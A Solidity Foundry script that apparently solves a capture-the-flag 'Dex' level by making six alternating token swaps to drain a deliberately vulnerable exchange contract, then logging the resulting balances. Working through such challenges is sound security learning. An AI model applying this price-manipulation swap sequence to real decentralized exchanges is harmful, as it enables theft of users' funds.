// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level22.sol";
import "forge-std/Script.sol";

contract ExploitLevel22 is Script {
    Dex instance = Dex(0x4B11d4B0591CEd555E7fd68DF3527614D23076C1);
    address token1Addr = instance.token1();
    address token2Addr = instance.token2();

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        instance.approve(address(instance), 100);

        instance.swap(token2Addr, token1Addr, 10);
        instance.swap(token1Addr, token2Addr, 20);
        instance.swap(token2Addr, token1Addr, 24);
        instance.swap(token1Addr, token2Addr, 30);
        instance.swap(token2Addr, token1Addr, 41);
        instance.swap(token1Addr, token2Addr, 45);

        vm.stopBroadcast();

        console.log(
            "Player balance of Token1:", instance.balanceOf(token1Addr, 0x9606e11178a83C364108e99fFFD2f7F75C99d801)
        );
        console.log(
            "Player balance of Token2:", instance.balanceOf(token2Addr, 0x9606e11178a83C364108e99fFFD2f7F75C99d801)
        );
        console.log("Instance balance of Token1:", instance.balanceOf(token1Addr, address(instance)));
        console.log("Instance balance of Token2:", instance.balanceOf(token2Addr, address(instance)));
    }
}
